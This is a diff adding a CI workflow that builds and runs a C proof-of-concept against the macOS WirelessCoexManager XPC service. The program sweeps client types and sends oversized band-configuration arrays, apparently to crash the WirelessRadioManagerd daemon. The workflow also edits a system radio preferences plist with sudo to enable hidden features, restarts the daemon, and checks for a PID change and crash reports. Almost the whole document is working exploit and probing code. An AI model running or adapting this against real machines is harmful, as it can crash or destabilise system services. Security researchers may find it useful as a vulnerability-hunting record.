@@ -1,0 +1,103 @@
+name: wcm-clienttype
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: macos-15
+    timeout-minutes: 12
+    steps:
+      - name: build poc (kClientType sweep)
+        run: |
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          static const char *SVC = "com.apple.WirelessCoexManager";
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+          static void one(xpc_connection_t c, int ctype, int nelem) {
+              xpc_object_t reg = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(reg, "kMessageId", 1);
+              xpc_object_t a1 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_int64(a1, "kClientType", ctype);
+              xpc_dictionary_set_uint64(a1, "kWCMRegisterProcess_ProcessId", ctype);
+              xpc_dictionary_set_value(reg, "kMessageArgs", a1);
+              xpc_object_t r = send_sync(c, reg, 2.0);
+              printf("  reg ctype=%d reply=%d\n", ctype, r != NULL);
+              if (r) xpc_release(r);
+
+              xpc_object_t arr = xpc_array_create(NULL, 0);
+              for (int i = 0; i < nelem; i++) {
+                  xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                  xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                  xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                  xpc_array_append_value(arr, e);
+                  xpc_release(e);
+              }
+              xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m, "kMessageId", 2600);
+              xpc_object_t a = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_value(a, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+              xpc_dictionary_set_int64(a, "kSubId", 0);
+              xpc_dictionary_set_value(m, "kMessageArgs", a);
+              printf("  2600 ctype=%d elems=%d ...\n", ctype, nelem); fflush(stdout);
+              xpc_object_t r2 = send_sync(c, m, 5.0);
+              printf("  2600 ctype=%d reply=%d\n", ctype, r2 != NULL);
+              if (r2) xpc_release(r2);
+          }
+          int main(int argc, char **argv) {
+              int nelem = (argc > 1) ? atoi(argv[1]) : 200;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) { printf("create=0\n"); return 1; }
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              printf("create=1 nelem=%d\n", nelem);
+              for (int t = 0; t <= 8; t++) one(c, t, nelem);
+              xpc_connection_cancel(c);
+              printf("DONE\n");
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+        continue-on-error: true
+
+      - name: run sweep and watch daemon
+        run: |
+          set +e
+          echo "=== 注入特性开关 + 重启 ==="
+          sudo mkdir -p /Library/Preferences
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures array" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures:0 string EnableULCA" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo /usr/libexec/PlistBuddy -c "Add :activeFeatures:1 string Bb20EndcSupport" /Library/Preferences/com.apple.radios.plist 2>&1
+          sudo chmod 644 /Library/Preferences/com.apple.radios.plist
+          sudo plutil -p /Library/Preferences/com.apple.radios.plist
+          sudo launchctl kickstart -k system/com.apple.WirelessRadioManager
+          sleep 8
+          echo "pid before: $(pgrep -x WirelessRadioManagerd | tr '\n' ' ')"
+          echo
+          echo "=== 跑 kClientType 0..8 扫描（每轮 200 元素）==="
+          /tmp/w/poc 200
+          echo "rc=$?"
+          sleep 4
+          PID_AFTER=$(pgrep -x WirelessRadioManagerd | tr '\n' ' ')
+          echo "pid after : $PID_AFTER"
+          echo
+          echo "=== 崩溃报告 ==="
+          sudo ls -lat /Library/Logs/DiagnosticReports/ 2>/dev/null | head -6
+          echo "=== daemon 日志尾部 ==="
+          sudo log show --last 2m --predicate 'process == "WirelessRadioManagerd"' 2>/dev/null | tail -12
+          true
+        continue-on-error: true
